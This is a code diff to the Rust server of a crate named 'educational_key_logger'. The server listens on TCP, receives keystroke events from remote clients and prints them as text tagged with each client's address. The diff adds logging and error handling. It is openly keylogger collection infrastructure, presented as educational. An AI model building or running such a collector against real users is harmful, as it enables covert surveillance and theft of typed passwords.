@@ -1,9 +1,10 @@
 mod parser;
 use educational_key_logger::IP_PORT;
 use educational_key_logger::input::InputEvent;
+use log::{error, info, warn};
 use parser::input_events_to_text;
 use std::io::{self, Read, Stdout};
-use std::net::{SocketAddr, TcpListener, TcpStream};
+use std::net::{TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
@@ -11,20 +12,53 @@ use std::time::Duration;
 const TIMEOUT_DURATION: Duration = Duration::from_secs(2);
 
 fn main() {
-    let listener = TcpListener::bind(IP_PORT).unwrap();
+    if std::env::var_os("RUST_LOG").is_none() {
+        unsafe {
+            std::env::set_var("RUST_LOG", "info");
+        }
+    }
+    env_logger::init();
+
+    let listener = match TcpListener::bind(IP_PORT) {
+        Ok(listener) => listener,
+        Err(err) => {
+            error!("Failed to bind {}: {}", IP_PORT, err);
+            return;
+        }
+    };
     let stdout_mutex = Arc::new(Mutex::new(io::stdout()));
-    for stream in listener.incoming() {
-        let stdout = stdout_mutex.clone();
-        thread::spawn(move || {
-            handle_stream(stream.unwrap(), stdout);
-        });
+    for stream_result in listener.incoming() {
+        match stream_result {
+            Ok(stream) => {
+                let peer_addr = match stream.peer_addr() {
+                    Ok(peer_addr) => peer_addr.to_string(),
+                    Err(_) => "UNKNOWN".to_string(),
+                };
+                info!("Client connected: {}", &peer_addr);
+                let stdout = stdout_mutex.clone();
+                thread::spawn(move || {
+                    handle_stream(stream, stdout, peer_addr);
+                });
+            }
+            Err(e) => {
+                if e.kind() == io::ErrorKind::ConnectionAborted {
+                    info!("Client aborted connection attempt: {}", e);
+                    continue;
+                } else if e.kind() == io::ErrorKind::Interrupted {
+                    info!("Accept operation interrupted: {}", e);
+                    continue;
+                } else {
+                    error!("Fatal listener error, shutting down: {}", e);
+                    break;
+                }
+            }
+        }
     }
 }
 
-fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>) {
+fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>, peer_addr: String) {
     let mut buffer = [0; 1024];
-    let mut stream_read_handler =
-        StreamReadHandler::new(stdout.clone(), stream.peer_addr().unwrap());
+    let mut stream_read_handler = StreamReadHandler::new(stdout.clone(), peer_addr);
     if let Err(e) = stream.set_read_timeout(Some(TIMEOUT_DURATION)) {
         eprintln!("Failed to set read timeout: {}", e);
         return;
@@ -32,21 +66,26 @@ fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>) {
     loop {
         match stream.read(&mut buffer) {
             Ok(0) => {
-                let _guard = stdout.lock().unwrap();
-                println!("Client disconnected");
+                let _guard = stdout
+                    .lock()
+                    .expect("System should not fail to aqquire mutex.");
+                info!("Client disconnected: {}", stream_read_handler.peer_addr);
                 break;
             }
             Ok(bytes_read) => {
                 stream_read_handler.read_buffer(&buffer[..bytes_read]);
             }
             Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
+                // TIMEOUT
                 if !stream_read_handler.input_events.is_empty() {
                     stream_read_handler.handle_input_events();
                 }
             }
             Err(e) => {
-                let _guard = stdout.lock().unwrap();
-                eprintln!("Read error: {}", e);
+                let _guard = stdout
+                    .lock()
+                    .expect("System should not fail to aqquire mutex.");
+                error!("Read error: {}", e);
                 break;
             }
         }
@@ -59,11 +98,11 @@ struct StreamReadHandler {
     input_event_buffer: Vec<u8>,
     input_events: Vec<InputEvent>,
     stdout: Arc<Mutex<Stdout>>,
-    peer_addr: SocketAddr,
+    peer_addr: String,
 }
 
 impl StreamReadHandler {
-    pub fn new(stdout: Arc<Mutex<Stdout>>, peer_addr: SocketAddr) -> StreamReadHandler {
+    pub fn new(stdout: Arc<Mutex<Stdout>>, peer_addr: String) -> StreamReadHandler {
         StreamReadHandler {
             size_prefix: None,
             input_event_buffer: vec![],
@@ -118,14 +157,14 @@ impl StreamReadHandler {
 
     fn handle_input_events(&mut self) {
         let input_events = std::mem::take(&mut self.input_events);
-        let _guard = self.stdout.lock().unwrap();
-        print!("{}: ", self.peer_addr);
-        println!("{}", input_events_to_text(&input_events))
-        // input_events.iter().for_each(|input_event| {
-        //     if input_event.is_key_press() {
-        //         print!("{}", input_event.code_as_string());
-        //     }
-        // });
-        // println!();
+        let _guard = self
+            .stdout
+            .lock()
+            .expect("System should not fail to aqquire mutex.");
+        println!(
+            "{}: {}",
+            self.peer_addr,
+            input_events_to_text(&input_events)
+        )
     }
 }
